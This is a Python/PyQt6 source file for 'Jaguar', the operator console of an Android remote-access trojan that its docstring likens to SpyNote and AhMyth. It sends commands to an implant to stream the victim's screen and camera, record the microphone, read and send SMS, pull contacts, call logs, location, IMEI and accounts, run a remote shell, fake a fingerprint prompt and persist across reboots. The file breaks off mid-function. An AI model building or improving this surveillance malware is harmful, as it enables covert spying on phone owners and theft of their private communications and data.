# -*- coding: utf-8 -*-
"""movil_dialog.py — módulo MÓVIL de Jaguar (Android / Termux).

Ventana profesional estilo SpyNote / CxRAT / AhMyth:

  [ cabecera: modelo, Android, batería, root, operador, IP ]
  [ pestañas: Pantalla · Cámara · Micrófono · SMS · Contactos · Llamadas ·
              Ubicación · Sensores · Sistema · Apps · Shell · Extras ]
  [ consola inferior ]

Todo va por comandos "movil_*" al agente. Si falta termux-api, cada pestaña
muestra el error concreto en vez de fallar en silencio.

--------------------------------------------------------------------------
CONTRATO CON MainWindow (no cambiar sin tocar los dos lados)
--------------------------------------------------------------------------
* Constructor: MovilDialog(cid, nombre, info=<dict>, parent=<MainWindow>)
* Señales que MainWindow invoca para empujar datos del agente:
      _sig_pantalla(str b64, int w, int h)   ← cmd "movil_pantalla"
      _sig_camara(str b64, int w, int h)     ← cmd "movil_camara"
      _sig_datos(str cmd, object datos)      ← cualquier otro "movil_*"
* MainWindow se registra a sí mismo como `parent` y añade el diálogo a
  `parent.movil_por_cid[cid]`. Al cerrar, el diálogo se quita solo de ahí.

--------------------------------------------------------------------------
BLINDAJE
--------------------------------------------------------------------------
* `self.ventana` es SIEMPRE el MainWindow (además de `self.parent`, que se
  mantiene por compatibilidad con el resto del repo). Ojo: asignar
  `self.parent` tapa la propiedad `parent` de QObject; por eso se guarda
  también una referencia limpia en `self.ventana` y TODO el código nuevo
  usa esa.
* `_enviar()` comprueba que el padre sigue vivo y que expone
  `_enviar_comando` antes de usarlo.
* Ninguna decodificación base64 puede tumbar la ventana: `_b64()` es
  tolerante a relleno raro y a bytes basura.
* Al cerrar: se paran TODOS los timers, se desconectan las señales y se
  limpia el registro del padre. Cero callbacks sobre widgets muertos.
"""

import base64
import json
import re
import time

from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QPixmap
from PyQt6.QtWidgets import (
    QDialog, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QLabel,
    QPushButton, QTabWidget, QPlainTextEdit, QTreeWidget, QTreeWidgetItem,
    QLineEdit, QComboBox, QSlider, QCheckBox, QGroupBox, QMessageBox,
    QSpinBox, QListWidget, QListWidgetItem, QFileDialog,
)

from jaguar.ui.theme import aplicar_tema_rojo_negro, ESTILO_BOTON, TENUE

# Paleta local mínima para las consolas.
_CONSOLA = "background:#0b0b0d;color:#ff5c5c;font-family:Consolas;border:none;"

# Comandos cuyo payload es texto plano en `datos` y van a la consola.
_CMDS_TEXTO = (
    "movil_bateria", "movil_almacenamiento", "movil_wifi", "movil_wifi_scan",
    "movil_telefonia", "movil_procesos", "movil_cuentas", "movil_notif_list",
    "movil_root", "movil_clip_get", "movil_persistir", "movil_info_extra",
    "movil_media", "movil_linterna", "movil_vibrar", "movil_fondo",
    "movil_huella", "movil_dialogo", "movil_notificar", "movil_toast",
    "movil_tts", "movil_clip_set", "movil_volumen", "movil_tecla",
    "movil_tap", "movil_texto", "movil_app_abrir", "movil_app_matar",
    "movil_sms_enviar", "movil_persistir_off",
)


def _b64(texto):
    """base64 tolerante: nunca lanza. Devuelve bytes (posiblemente vacíos)."""
    if not texto:
        return b""
    if isinstance(texto, bytes):
        datos = texto
    else:
        datos = str(texto).strip().encode("ascii", "ignore")
    # Relleno correcto (el agente a veces manda sin '=' final).
    resto = len(datos) % 4
    if resto:
        datos += b"=" * (4 - resto)
    try:
        return base64.b64decode(datos)
    except Exception:
        try:
            return base64.b64decode(datos, validate=False)
        except Exception:
            return b""


class MovilDialog(QDialog):
    """Panel de control del agente Android/Termux.

    No ejecuta nada por sí mismo: emite `movil_*` al agente a través del
    MainWindow y pinta lo que vuelve.
    """

    _sig_log = pyqtSignal(str)
    _sig_pantalla = pyqtSignal(str, int, int)
    _sig_camara = pyqtSignal(str, int, int)
    _sig_datos = pyqtSignal(str, object)
    _sig_cerrado = pyqtSignal(str)

    def __init__(self, cid, nombre, info=None, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.ventana = parent          # referencia limpia al MainWindow
        self.parent = parent           # compatibilidad con el resto del repo
        self.info = dict(info or {})
        self.rem_w, self.rem_h = 1080, 2340
        self._esc = 1.0
        self._off_x = 0
        self._off_y = 0
        self._vivo = False
        self._cerrado = False
        self._cam_raw = None
        self._mic_raw = None

        titulo = self.info.get("host") or nombre or cid[:8]
        self.setWindowTitle(f"Móvil — {titulo} ({cid[:8]})")
        self.resize(1240, 840)
        aplicar_tema_rojo_negro(self)

        # Señales internas: SIEMPRE entregadas en el hilo de la GUI.
        self._sig_log.connect(self._log)
        self._sig_pantalla.connect(self._pantalla)
        self._sig_camara.connect(self._camara)
        self._sig_datos.connect(self._datos)

        self._build()
        self._pedir_info()

    # =====================================================================
    # UI
    # =====================================================================
    def _build(self):
        raiz = QVBoxLayout(self)
        raiz.setContentsMargins(10, 8, 10, 8)
        raiz.setSpacing(6)

        # ---- cabecera ---------------------------------------------------
        cab = QWidget()
        ch = QHBoxLayout(cab)
        ch.setContentsMargins(0, 0, 0, 0)
        ch.addWidget(QLabel("<b style='color:#ff2b2b;font-size:13pt;'>📱 MÓVIL</b>"
                            "<span style='color:#8a8a92;'> · Android / Termux</span>"))
        self.lbl_modelo = QLabel("conectando...")
        self.lbl_modelo.setStyleSheet("color:#eaeaea;")
        self.lbl_modelo.setTextInteractionFlags(
            Qt.TextInteractionFlag.TextSelectableByMouse)
        ch.addWidget(self.lbl_modelo, 1)
        self.chip_bat = QLabel("🔋 —")
        self.chip_alm = QLabel("💾 —")
        self.chip_root = QLabel("🔒 —")
        self.chip_ip = QLabel("🌐 —")
        for c in (self.chip_bat, self.chip_alm, self.chip_root, self.chip_ip):
            c.setStyleSheet("background:#141417;border:1px solid #2a2a30;"
                            "border-radius:9px;padding:4px 9px;color:#cfcfd6;")
            ch.addWidget(c)
        b_ref = QPushButton("⟳")
        b_ref.setFixedWidth(34)
        b_ref.setStyleSheet(ESTILO_BOTON)
        b_ref.setToolTip("Volver a pedir la info del dispositivo")
        b_ref.clicked.connect(self._pedir_info)
        ch.addWidget(b_ref)
        raiz.addWidget(cab)

        # ---- pestañas ---------------------------------------------------
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.addTab(self._tab_pantalla(), "  📺 Pantalla  ")
        self.tabs.addTab(self._tab_camara(), "  📷 Cámara  ")
        self.tabs.addTab(self._tab_micro(), "  🎤 Micrófono  ")
        self.tabs.addTab(self._tab_sms(), "  💬 SMS  ")
        self.tabs.addTab(self._tab_contactos(), "  👥 Contactos  ")
        self.tabs.addTab(self._tab_llamadas(), "  📞 Llamadas  ")
        self.tabs.addTab(self._tab_ubicacion(), "  📍 Ubicación  ")
        self.tabs.addTab(self._tab_sensores(), "  📡 Sensores  ")
        self.tabs.addTab(self._tab_sistema(), "  🔋 Sistema  ")
        self.tabs.addTab(self._tab_apps(), "  📦 Apps  ")
        self.tabs.addTab(self._tab_shell(), "  🖥 Shell  ")
        self.tabs.addTab(self._tab_extras(), "  🎛 Extras  ")
        raiz.addWidget(self.tabs, 1)

        # ---- consola ----------------------------------------------------
        self.consola = QPlainTextEdit()
        self.consola.setReadOnly(True)
        self.consola.setFixedHeight(130)
        self.consola.setMaximumBlockCount(4000)
        self.consola.setStyleSheet(_CONSOLA)
        raiz.addWidget(self.consola)

        # ---- timers -----------------------------------------------------
        self.timer_pantalla = QTimer(self)
        self.timer_pantalla.timeout.connect(lambda: self._enviar("movil_pantalla"))
        self.timer_camara = QTimer(self)
        self.timer_camara.timeout.connect(
            lambda: self._enviar("movil_camara", {"cam": self._cam_idx()}))
        self.timer_info = QTimer(self)
        self.timer_info.timeout.connect(self._pedir_info)
        self.timer_info.start(20000)

    # ------------------------------------------------------------ pantalla
    def _tab_pantalla(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        l.setSpacing(6)

        barra = QHBoxLayout()
        self.chk_vivo = QCheckBox("Pantalla en vivo")
        self.chk_vivo.stateChanged.connect(self._toggle_vivo)
        barra.addWidget(self.chk_vivo)
        barra.addWidget(QLabel("FPS:"))
        self.sp_fps = QSpinBox()
        self.sp_fps.setRange(1, 15)
        self.sp_fps.setValue(4)
        self.sp_fps.setFixedWidth(58)
        barra.addWidget(self.sp_fps)
        barra.addWidget(QLabel("Calidad:"))
        self.sl_cal = QSlider(Qt.Orientation.Horizontal)
        self.sl_cal.setRange(20, 95)
        self.sl_cal.setValue(70)
        self.sl_cal.setFixedWidth(110)
        barra.addWidget(self.sl_cal)
        self.chk_tap = QCheckBox("Control táctil (necesita root)")
        barra.addWidget(self.chk_tap)
        b_rot = QPushButton("⟳ Refrescar")
        b_rot.setStyleSheet(ESTILO_BOTON)
        b_rot.clicked.connect(lambda: self._enviar("movil_pantalla"))
        barra.addWidget(b_rot)
        barra.addStretch()
        self.lbl_pant = QLabel("—")
        self.lbl_pant.setStyleSheet(f"color:{TENUE};")
        barra.addWidget(self.lbl_pant)
        l.addLayout(barra)

        barra2 = QHBoxLayout()
        for txt, key in (("◀ Atrás", 4), ("🏠 Inicio", 3), ("🗂 Recientes", 187),
                         ("🔊 Subir vol", 24), ("🔉 Bajar vol", 25),
                         ("⏻ Bloquear", 26), ("🌙 Apagar", 26)):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, k=key: self._enviar("movil_tecla", {"code": k}))
            barra2.addWidget(b)
        barra2.addWidget(QLabel("Texto:"))
        self.in_texto = QLineEdit()
        self.in_texto.setPlaceholderText("escribir en el móvil…")
        self.in_texto.returnPressed.connect(self._enviar_texto)
        barra2.addWidget(self.in_texto, 1)
        b_tx = QPushButton("⌨ Enviar")
        b_tx.setStyleSheet(ESTILO_BOTON)
        b_tx.clicked.connect(self._enviar_texto)
        barra2.addWidget(b_tx)
        l.addLayout(barra2)

        self.pantalla = QLabel("activa «Pantalla en vivo»")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        self.pantalla.setMouseTracking(True)
        self.pantalla.mousePressEvent = self._click_pantalla
        l.addWidget(self.pantalla, 1)
        return w

    def _toggle_vivo(self):
        self._vivo = self.chk_vivo.isChecked()
        if self._vivo:
            self.timer_pantalla.start(max(66, 1000 // max(1, self.sp_fps.value())))
        else:
            self.timer_pantalla.stop()

    def _pantalla(self, b64, w, h):
        if self._cerrado or not b64:
            return
        self.rem_w = max(1, int(w or self.rem_w or 1080))
        self.rem_h = max(1, int(h or self.rem_h or 2340))
        pm = QPixmap()
        pm.loadFromData(_b64(b64))
        if pm.isNull():
            return
        area = self.pantalla.size()
        esc = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                        Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(esc)
        self._off_x = (area.width() - esc.width()) // 2
        self._off_y = (area.height() - esc.height()) // 2
        self._esc = (esc.width() / self.rem_w) if self.rem_w else 1.0
        self.lbl_pant.setText(f"{self.rem_w}x{self.rem_h}")

    def _coords(self, pos):
        x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
        y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
        return max(0, min(self.rem_w, x)), max(0, min(self.rem_h, y))

    def _click_pantalla(self, e):
        if not self.chk_tap.isChecked():
            return
        x, y = self._coords(e.position().toPoint())
        self._enviar("movil_tap", {"x": x, "y": y})
        self._log(f"[tap] {x},{y}")

    def _enviar_texto(self):
        t = self.in_texto.text()
        if t:
            self._enviar("movil_texto", {"texto": t})
            self.in_texto.clear()

    # -------------------------------------------------------------- camara
    def _tab_camara(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        barra.addWidget(QLabel("Cámara:"))
        self.cb_cam = QComboBox()
        self.cb_cam.addItems(["Trasera (0)", "Frontal (1)", "Externa (2)"])
        barra.addWidget(self.cb_cam)
        b_foto = QPushButton("📸 Foto")
        b_foto.setStyleSheet(ESTILO_BOTON)
        b_foto.clicked.connect(lambda: self._enviar("movil_camara",
                                                    {"cam": self._cam_idx()}))
        barra.addWidget(b_foto)
        self.chk_cam_vivo = QCheckBox("En vivo")
        self.chk_cam_vivo.stateChanged.connect(self._toggle_cam)
        barra.addWidget(self.chk_cam_vivo)
        b_guardar = QPushButton("💾 Guardar")
        b_guardar.setStyleSheet(ESTILO_BOTON)
        b_guardar.clicked.connect(self._guardar_camara)
        barra.addWidget(b_guardar)
        barra.addStretch()
        self.lbl_cam = QLabel("—")
        self.lbl_cam.setStyleSheet(f"color:{TENUE};")
        barra.addWidget(self.lbl_cam)
        l.addLayout(barra)
        self.camara = QLabel("pulsa «Foto»")
        self.camara.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.camara.setStyleSheet("background:#000;")
        l.addWidget(self.camara, 1)
        return w

    def _cam_idx(self):
        return self.cb_cam.currentIndex()

    def _toggle_cam(self):
        if self.chk_cam_vivo.isChecked():
            self.timer_camara.start(1500)
        else:
            self.timer_camara.stop()

    def _camara(self, b64, w, h):
        if self._cerrado or not b64:
            return
        self._cam_raw = _b64(b64)
        pm = QPixmap()
        pm.loadFromData(self._cam_raw)
        if pm.isNull():
            return
        self.camara.setPixmap(pm.scaled(
            self.camara.size(), Qt.AspectRatioMode.KeepAspectRatio,
            Qt.TransformationMode.SmoothTransformation))
        self.lbl_cam.setText(f"{w}x{h}")

    def _guardar_camara(self):
        raw = self._cam_raw
        if not raw:
            self._log("[cam] no hay foto en memoria")
            return
        ruta, _ = QFileDialog.getSaveFileName(self, "Guardar foto",
                                              f"movil_{int(time.time())}.jpg",
                                              "JPEG (*.jpg);;Todos (*)")
        if not ruta:
            return
        try:
            with open(ruta, "wb") as f:
                f.write(raw)
            self._log(f"[cam] guardado {ruta}")
        except OSError as exc:
            self._log(f"[cam] error al guardar: {exc}")

    # ------------------------------------------------------------ microfono
    def _tab_micro(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        barra.addWidget(QLabel("Segundos:"))
        self.sp_mic = QSpinBox()
        self.sp_mic.setRange(2, 120)
        self.sp_mic.setValue(10)
        barra.addWidget(self.sp_mic)
        b = QPushButton("🎙 Grabar")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_mic",
                                               {"segundos": self.sp_mic.value()}))
        barra.addWidget(b)
        b2 = QPushButton("💾 Guardar último")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._guardar_mic)
        barra.addWidget(b2)
        barra.addStretch()
        l.addLayout(barra)
        self.out_mic = QPlainTextEdit()
        self.out_mic.setReadOnly(True)
        self.out_mic.setStyleSheet(_CONSOLA)
        l.addWidget(self.out_mic, 1)
        return w

    def _guardar_mic(self):
        raw = self._mic_raw
        if not raw:
            self._log("[mic] no hay grabación")
            return
        ruta, _ = QFileDialog.getSaveFileName(self, "Guardar audio",
                                              f"movil_{int(time.time())}.m4a",
                                              "Audio (*.m4a *.wav *.mp3);;Todos (*)")
        if not ruta:
            return
        try:
            with open(ruta, "wb") as f:
                f.write(raw)
            self._log(f"[mic] guardado {ruta}")
        except OSError as exc:
            self._log(f"[mic] error al guardar: {exc}")

    # ----------------------------------------------------------------- SMS
    def _tab_sms(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        b = QPushButton("⟳ Cargar SMS")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_sms", {"limite": 60}))
        barra.addWidget(b)
        self.chk_sms_enviar = QCheckBox("Modo envío")
        barra.addWidget(self.chk_sms_enviar)
        barra.addWidget(QLabel("Número:"))
        self.in_sms_num = QLineEdit()
        self.in_sms_num.setFixedWidth(150)
        barra.addWidget(self.in_sms_num)
        barra.addWidget(QLabel("Texto:"))
        self.in_sms_txt = QLineEdit()
        self.in_sms_txt.returnPressed.connect(self._enviar_sms)
        barra.addWidget(self.in_sms_txt, 1)
        b2 = QPushButton("✉ Enviar")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._enviar_sms)
        barra.addWidget(b2)
        l.addLayout(barra)
        self.tabla_sms = QTreeWidget()
        self.tabla_sms.setHeaderLabels(["Número", "Fecha", "Tipo", "Texto"])
        self.tabla_sms.setColumnWidth(0, 150)
        self.tabla_sms.setColumnWidth(1, 150)
        self.tabla_sms.setColumnWidth(2, 90)
        self.tabla_sms.setAlternatingRowColors(True)
        l.addWidget(self.tabla_sms, 1)
        return w

    def _enviar_sms(self):
        num = self.in_sms_num.text().strip()
        txt = self.in_sms_txt.text().strip()
        if num and txt:
            self._enviar("movil_sms_enviar", {"numero": num, "texto": txt})
            self.in_sms_txt.clear()
        elif not num:
            self._log("[sms] falta el número")

    # ----------------------------------------------------------- contactos
    def _tab_contactos(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        b = QPushButton("⟳ Cargar contactos")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_contactos"))
        l.addWidget(b)
        self.tabla_cont = QTreeWidget()
        self.tabla_cont.setHeaderLabels(["Nombre", "Teléfonos"])
        self.tabla_cont.setColumnWidth(0, 240)
        self.tabla_cont.setAlternatingRowColors(True)
        l.addWidget(self.tabla_cont, 1)
        return w

    # ------------------------------------------------------------ llamadas
    def _tab_llamadas(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        b = QPushButton("⟳ Cargar registro de llamadas")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_llamadas", {"limite": 60}))
        l.addWidget(b)
        self.tabla_llam = QTreeWidget()
        self.tabla_llam.setHeaderLabels(["Número", "Fecha", "Duración", "Tipo"])
        self.tabla_llam.setColumnWidth(0, 180)
        self.tabla_llam.setAlternatingRowColors(True)
        l.addWidget(self.tabla_llam, 1)
        return w

    # ----------------------------------------------------------- ubicacion
    def _tab_ubicacion(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        b = QPushButton("📍 Obtener ubicación")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_ubicacion"))
        barra.addWidget(b)
        b2 = QPushButton("🗺 Abrir en mapa")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._abrir_mapa)
        barra.addWidget(b2)
        barra.addStretch()
        l.addLayout(barra)
        self.out_ubi = QPlainTextEdit()
        self.out_ubi.setReadOnly(True)
        self.out_ubi.setStyleSheet(_CONSOLA)
        l.addWidget(self.out_ubi, 1)
        return w

    def _abrir_mapa(self):
        import webbrowser
        t = self.out_ubi.toPlainText()
        m = (re.search(r'"latitude":\s*(-?[\d.]+)', t)
             or re.search(r"lat[^-\d]*(-?[\d.]+)", t))
        n = (re.search(r'"longitude":\s*(-?[\d.]+)', t)
             or re.search(r"lon[^-\d]*(-?[\d.]+)", t))
        if m and n:
            webbrowser.open(f"https://www.google.com/maps?q={m.group(1)},{n.group(1)}")
        else:
            self._log("[ubi] sin coordenadas todavía")

    # ------------------------------------------------------------ sensores
    def _tab_sensores(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        b = QPushButton("⟳ Listar sensores")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_sensores", {"listar": True}))
        barra.addWidget(b)
        barra.addWidget(QLabel("Leer:"))
        self.in_sensor = QLineEdit()
        self.in_sensor.setPlaceholderText("accelerometer")
        barra.addWidget(self.in_sensor, 1)
        b2 = QPushButton("📡 Leer")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(lambda: self._enviar("movil_sensores",
                                                {"nombre": self.in_sensor.text().strip()}))
        barra.addWidget(b2)
        l.addLayout(barra)
        self.out_sens = QPlainTextEdit()
        self.out_sens.setReadOnly(True)
        self.out_sens.setStyleSheet(_CONSOLA)
        l.addWidget(self.out_sens, 1)
        return w

    # ------------------------------------------------------------- sistema
    def _tab_sistema(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        grid = QGridLayout()
        acciones = [
            ("🔋 Batería", "movil_bateria", {}),
            ("💾 Almacenamiento", "movil_almacenamiento", {}),
            ("📶 WiFi actual", "movil_wifi", {}),
            ("📡 Escanear WiFi", "movil_wifi_scan", {}),
            ("📞 Telefonía / IMEI", "movil_telefonia", {}),
            ("🖥 Procesos", "movil_procesos", {}),
            ("🧩 Info del dispositivo", "movil_info", {}),
            ("👤 Cuentas", "movil_cuentas", {}),
            ("🔔 Notificaciones activas", "movil_notif_list", {}),
        ]
        for i, (txt, cmd, args) in enumerate(acciones):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, c=cmd, a=args: self._enviar(c, a))
            grid.addWidget(b, i // 3, i % 3)
        l.addLayout(grid)
        self.out_sist = QPlainTextEdit()
        self.out_sist.setReadOnly(True)
        self.out_sist.setStyleSheet(_CONSOLA)
        self.out_sist.setMaximumBlockCount(3000)
        l.addWidget(self.out_sist, 1)
        return w

    # ----------------------------------------------------------------- apps
    def _tab_apps(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        barra = QHBoxLayout()
        b = QPushButton("⟳ Listar paquetes instalados")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(lambda: self._enviar("movil_apps", {"tipo": "usuario"}))
        barra.addWidget(b)
        b2 = QPushButton("⟳ Todos (incluye sistema)")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(lambda: self._enviar("movil_apps", {"tipo": "todos"}))
        barra.addWidget(b2)
        barra.addWidget(QLabel("Abrir paquete:"))
        self.in_app = QLineEdit()
        self.in_app.setPlaceholderText("com.whatsapp")
        barra.addWidget(self.in_app, 1)
        b3 = QPushButton("▶ Abrir")
        b3.setStyleSheet(ESTILO_BOTON)
        b3.clicked.connect(lambda: self._enviar("movil_app_abrir",
                                                {"paquete": self.in_app.text().strip()}))
        barra.addWidget(b3)
        b4 = QPushButton("⛔ Forzar cierre")
        b4.setStyleSheet(ESTILO_BOTON)
        b4.clicked.connect(lambda: self._enviar("movil_app_matar",
                                                {"paquete": self.in_app.text().strip()}))
        barra.addWidget(b4)
        l.addLayout(barra)
        self.lista_apps = QListWidget()
        self.lista_apps.itemDoubleClicked.connect(self._app_doble_clic)
        l.addWidget(self.lista_apps, 1)
        return w

    def _app_doble_clic(self, item):
        """Doble clic en la lista = abrir ese paquete (ahorra tecleo)."""
        paquete = item.data(Qt.ItemDataRole.UserRole) or item.text()
        if paquete:
            self.in_app.setText(str(paquete))
            self._enviar("movil_app_abrir", {"paquete": str(paquete)})

    # ---------------------------------------------------------------- shell
    def _tab_shell(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        self.out_shell = QPlainTextEdit()
        self.out_shell.setReadOnly(True)
        self.out_shell.setStyleSheet(_CONSOLA)
        l.addWidget(self.out_shell, 1)
        fila = QHBoxLayout()
        fila.addWidget(QLabel("shell>"))
        self.in_shell = QLineEdit()
        self.in_shell.returnPressed.connect(self._shell)
        fila.addWidget(self.in_shell)
        l.addLayout(fila)
        b = QPushButton("Ejecutar")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(self._shell)
        l.addWidget(b)
        return w

    def _shell(self):
        cmd = self.in_shell.text().strip()
        if not cmd:
            return
        self.out_shell.appendPlainText(f"> {cmd}")
        self.in_shell.clear()
        self._enviar("shell", {"comando": cmd})

    # --------------------------------------------------------------- extras
    def _tab_extras(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(8, 8, 8, 8)
        l.setSpacing(8)

        g1 = QGroupBox("Interacción")
        g1l = QGridLayout(g1)
        self.in_ex_texto = QLineEdit("Hola desde Jaguar")
        g1l.addWidget(QLabel("Texto:"), 0, 0)
        g1l.addWidget(self.in_ex_texto, 0, 1, 1, 3)
        for i, (txt, cmd) in enumerate([
                ("🔔 Notificación", "movil_notificar"),
                ("💬 Toast", "movil_toast"),
                ("🗣 Hablar (TTS)", "movil_tts"),
                ("📋 Portapapeles → traer", "movil_clip_get"),
                ("📋 Portapapeles ← enviar", "movil_clip_set"),
                ("👆 Vibrar", "movil_vibrar"),
                ("🔦 Linterna ON/OFF", "movil_linterna"),
                ("🖼 Fondo de pantalla", "movil_fondo"),
                ("🔐 Huella (prompt)", "movil_huella"),
                ("📣 Diálogo", "movil_dialogo"),
                ("🎵 Media play/pause", "movil_media"),
                ("🔊 Volumen máx", "movil_volumen")]):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, c=cmd: self._enviar(
                c, {"texto": self.in_ex_texto.text(), "titulo": "Jaguar"}))
            g1l.addWidget(b, 1 + i // 3, i % 3)
        l.addWidget(g1)

        g2 = QGroupBox("Persistencia y arranque")
        g2l = QHBoxLayout(g2)
        for txt, cmd, args in (("📌 Persistir (Termux:Boot)", "movil_persistir", {}),
                               ("🚀 Reiniciar agente", "beacon_reconectar", {}),
                               ("☠ Matar agente", "beacon_kill", {}),
                               ("🔓 Comprobar root", "movil_root", {})):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, c=cmd, a=args: self._enviar(c, a))
            g2l.addWidget(b)
        g2l.addStretch()
        l.addWidget(g2)

        self.out_extra = QPlainTextEdit()
        self.out_extra.setReadOnly(True)
        self.out_extra.setStyleSheet(_CONSOLA)
        self.out_extra.setMaximumBlockCount(3000)
        l.addWidget(self.out_extra, 1)
        return w

    # =====================================================================
    # ENVÍO AL AGENTE
    # =====================================================================
    def _enviar(self, cmd, args=None):
        """Manda un comando al agente por el MainWindow. Nunca lanza."""
        if self._cerrado:
            return
        ventana = self.ventana
        if ventana is None or not hasattr(ventana, "_enviar_comando"):
            self._log(f"[!] sin canal hacia el agente para '{cmd}'")
            return
        try:
            ventana._enviar_comando(self.cid, cmd, args or {})
        except Exception as exc:
            self._log(f"[!] error enviando '{cmd}': {exc}")

    def _pedir_info(self):
        self._enviar("movil_info")

    def _log(self, t):
        if self._cerrado:
            return
        self.consola.appendPlainText(str(t))

    # =====================================================================
    # RECEPCIÓN DE DATOS (siempre en el hilo de la GUI)
    # =====================================================================
    def _datos(self, cmd, datos):
        """Reparte la respuesta `movil_*` a la pestaña correspondiente."""
        if self._cerrado:
            return
        if not isinstance(datos, dict):
            datos = {"valor": datos}
        cmd = str(cmd or "")

        if datos.get("error"):
            self._log(f"[{cmd}] ERROR: {datos['error']}")

        try:
            if cmd == "movil_info":
                self._pintar_info(datos)
            elif cmd == "movil_sms":
                self._pintar_sms(datos.get("lista", []))
            elif cmd == "movil_contactos":
                self._pintar_contactos(datos.get("lista", []))
            elif cmd == "movil_llamadas":
                self._pintar_llamadas(datos.get("lista", []))
            elif cmd == "movil_apps":
                self._pintar_apps(datos.get("lista", []))
            elif cmd == "movil_mic":
                raw = _b64(datos.get("b64", ""))
                self._mic_raw = raw
                self.out_mic.appendPlainText(
                    f"[mic] grabado {len(raw)} bytes ({datos.get('segundos')}s)")
            elif cmd == "movil_ubicacion":
                self.out_ubi.setPlainText(json.dumps(datos, indent=2,
                                                     ensure_ascii=False))
            elif cmd == "movil_sensores":
                self.out_sens.setPlainText(json.dumps(datos, indent=2,
                                                      ensure_ascii=False))
            elif cmd in _CMDS_TEXTO:
                self.out_sist.appendPlainText(
                    f"--- {cmd} ---\n"
                    f"{json.dumps(datos, indent=2, ensure_ascii=False)}\n")
            else:
                self.out_extra.appendPlainText(
                    f"[{cmd}] {json.dumps(datos, ensure_ascii=False)[:800]}")
        except Exception as exc:  # jamás dejar caer la ventana por un pintado
            self._log(f"[{cmd}] fallo al pintar: {exc}")

    def _pintar_info(self, d):
        modelo = f"{d.get('marca', '')} {d.get('modelo', '')}".strip() or "Android"
        self.lbl_modelo.setText(
            f"<b style='color:#ff2b2b;'>{modelo}</b> · Android {d.get('android', '?')} "
            f"(SDK {d.get('sdk', '?')}) · {d.get('operador', '')}")
        bat = d.get("bateria") or {}
        if not isinstance(bat, dict):
            bat = {}
        pct = bat.get("percentage")
        temp = bat.get("temperature")
        self.chip_bat.setText(f"🔋 {pct}%" + (f" {temp}°C" if temp else "")
                              if pct is not None else "🔋 —")
        alm = d.get("almacenamiento", "")
        self.chip_alm.setText(f"💾 {alm}" if alm else "💾 —")
        root = bool(d.get("root"))
        self.chip_root.setText("🔓 ROOT" if root else "🔒 sin root")
        self.chip_root.setStyleSheet(
            "background:#141417;border:1px solid #2a2a30;border-radius:9px;"
            "padding:4px 9px;color:#3ddc4a;" if root else
            "background:#141417;border:1px solid #2a2a30;border-radius:9px;"
            "padding:4px 9px;color:#ffb84d;")
        self.chip_ip.setText(f"🌐 {d.get('ip', '—')}")
        self._log(f"[info] {modelo} · Android {d.get('android', '?')} · "
                  f"root={root} · termux-api={d.get('termux_api')}")

    def _pintar_sms(self, lista):
        self.tabla_sms.clear()
        for s in (lista or []):
            if not isinstance(s, dict):
                s = {"texto": s}
            tipo = s.get("tipo")
            QTreeWidgetItem(self.tabla_sms,
                            [str(s.get("numero", "")), str(s.get("fecha", "")),
                             "IN" if tipo in ("inbox", 1) else "OUT",
                             str(s.get("texto", ""))[:180]])

    def _pintar_contactos(self, lista):
        self.tabla_cont.clear()
        for c in (lista or []):
            if not isinstance(c, dict):
